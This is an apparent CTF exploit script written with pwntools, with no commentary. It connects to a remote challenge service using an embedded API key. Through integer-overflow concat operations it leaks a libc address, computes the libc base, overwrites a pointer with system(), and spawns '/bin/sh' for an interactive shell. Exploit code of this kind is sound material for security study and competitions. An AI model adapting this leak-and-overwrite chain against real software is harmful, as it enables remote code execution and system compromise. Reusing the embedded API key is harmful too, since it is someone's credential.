from pwn import *
import json

a = {
    'apikey' : 'b63f4aa4d80f0b2b2f925d6bf6b3666c32a6632c76a4ac9c3a7ccd67fc7e67d6',
}
libc = ELF('./libc')
r = remote('rss.eatpwnnosleep.com', 12345)
r.sendline(json.dumps(a).encode())
#r.recvuntil('Restore from RSS!!\n')
def addint(n):
    r.sendlineafter('>> ', '1')
    r.sendlineafter('? ', str(n))

def addstr(n):
    r.sendlineafter('>> ', '2')
    r.sendlineafter('? ', n)


def concat(f, t):
    r.sendlineafter('>> ', '3')
    r.sendlineafter('>> ', '1')
    r.sendlineafter(': ', str(f))
    r.sendlineafter(': ', str(t))

def substr(idx, f, t):
    r.sendlineafter('>> ', '3')
    r.sendlineafter('>> ', '2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(f))
    r.sendlineafter(': ', str(t))

def list():
    r.sendlineafter('>> ', '4')
base = 4611686018427387903 # 0x3fffffffffffffff
addint(base)
addint(0x412920)
concat(0, 1)
list()
r.recvuntil('[1] String: ')
tmp = r.recvline()[:-1]
leak = u64(tmp.ljust(8, '\x00'))
libc.address = leak-libc.symbols['setvbuf']
log.info('LIBC BASE: 0x{:016X}'.format(libc.address))
addstr('/bin/sh;'.ljust(0x100, 'b'))#3
addint(base)#2
addint(0x412978)#1
concat(1, 0)
substr(0, 0, 0)
addstr(p64(libc.symbols['system']))#0
concat(0, 1)
concat(3, 2)
r.interactive()
